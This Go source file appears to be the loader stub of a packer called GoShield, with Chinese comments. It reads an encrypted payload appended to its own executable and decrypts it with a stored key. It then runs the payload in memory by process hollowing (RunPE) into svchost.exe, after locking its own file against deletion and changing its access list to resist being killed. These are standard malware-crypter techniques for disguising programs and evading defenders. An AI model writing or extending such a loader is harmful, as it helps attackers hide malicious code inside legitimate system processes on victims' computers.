// 文件路径: stub/main.go
package main

import (
	"encoding/binary"
	"io"
	"os"

	"github.com/Limkon/GoShield/internal/crypto"
	"github.com/Limkon/GoShield/internal/loader"
	"github.com/Limkon/GoShield/internal/protect"
)

func main() {
	// 1. 先从自身读取附加数据 (为了避免与后续的独占防删锁冲突，先读取数据到内存)
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}

	file, err := os.Open(exePath)
	if err != nil {
		os.Exit(1)
	}

	stat, err := file.Stat()
	if err != nil {
		file.Close()
		os.Exit(1)
	}
	fileSize := stat.Size()

	// 尾部结构大小: Key(32) + PayloadSize(8) + Magic(8) = 48 字节
	footerSize := int64(48)
	if fileSize < footerSize {
		file.Close()
		os.Exit(1) // 无附加数据
	}

	// 定位并读取尾部 48 字节
	file.Seek(-footerSize, io.SeekEnd)
	footer := make([]byte, footerSize)
	io.ReadFull(file, footer)

	// 校验特征码
	if string(footer[40:48]) != "GOSHIELD" {
		file.Close()
		os.Exit(1) // 非法篡改或未加壳
	}

	// 解析 Payload 大小和密钥
	key := footer[0:32]
	payloadSize := binary.LittleEndian.Uint64(footer[32:40])

	if fileSize < footerSize+int64(payloadSize) {
		file.Close()
		os.Exit(1) // 文件损坏
	}

	// 定位并读取密文 Payload
	file.Seek(-(footerSize + int64(payloadSize)), io.SeekEnd)
	encryptedPayload := make([]byte, payloadSize)
	io.ReadFull(file, encryptedPayload)
	
	// 读取完毕，立刻关闭文件句柄，释放系统默认锁
	file.Close()

	// 2. 启动最强防御：独占锁定自身防删 (ShareMode=0)，修改 DACL 防杀
	protect.EnableProtection()

	// 3. 解密真实程序的 Payload
	decryptedPayload, err := crypto.Decrypt(encryptedPayload, key)
	if err != nil {
		os.Exit(1) // 密文损坏或被篡改，防分析
	}

	// 4. 执行内存加载 (RunPE)，此方法现已改为阻塞执行
	targetHost := "C:\\Windows\\System32\\svchost.exe"
	err = loader.Execute(targetHost, decryptedPayload)
	if err != nil {
		os.Exit(1)
	}

	// 5. 真实程序已退出，外壳自动顺延执行到末尾并退出
	// 进程退出后，Windows 会自动回收防删持有的 FileHandle 并销毁 DACL 防护对象
}
